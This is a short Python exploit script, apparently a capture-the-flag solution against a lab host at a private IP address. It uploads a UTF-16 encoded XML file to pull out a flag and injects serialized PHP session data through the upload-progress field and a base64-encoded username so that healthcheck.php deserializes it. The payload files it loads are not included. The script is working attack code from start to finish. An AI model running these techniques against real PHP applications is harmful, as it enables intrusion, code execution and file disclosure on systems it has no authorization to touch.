import requests
import base64
import re

url = "http://192.168.169.132:8002"  # Replace with your target URL

def exploit_flag2_way1():
    headers = {
        "Cookie": "PHPSESSID=cccccc"
    }

    # Create a dictionary for the form fields and files
    data = {
        "PHP_SESSION_UPLOAD_PROGRESS": b"|" + open("payload2", "rb").read(),
    }

    # Define the file to be sent
    files = {
        "file": ("passwd", 'cccccccccccccccccc', "application/octet-stream"),
    }

    requests.post(url, headers=headers, data=data, files=files, verify=False)
    response = requests.get(url + "/healthcheck.php", headers=headers, verify=False)
    print(response.text)

def exploit_flag2_way2():
    s = requests.Session()
    data = {'username': base64.b64encode(b"acde|" + open("payload2", "rb").read())}
    s.post(url, data=data)
    r = s.get(url + '/healthcheck.php')
    print(r.text)

def exploit_flag1():
    s = requests.Session()
    data = {'username': base64.b64encode(b"blabla")}
    s.post(url, data=data)
    files = {
        "file": ("test.xml", open('payload.xml', 'r').read().encode('utf-16')),
    }
    r = s.post(url + '/home.php', files=files)
    flag = re.search(r'ASCIS{.*}', r.text).group(0)
    print(flag)

if __name__ == "__main__":
    exploit_flag1()
    exploit_flag2_way1()
    exploit_flag2_way2()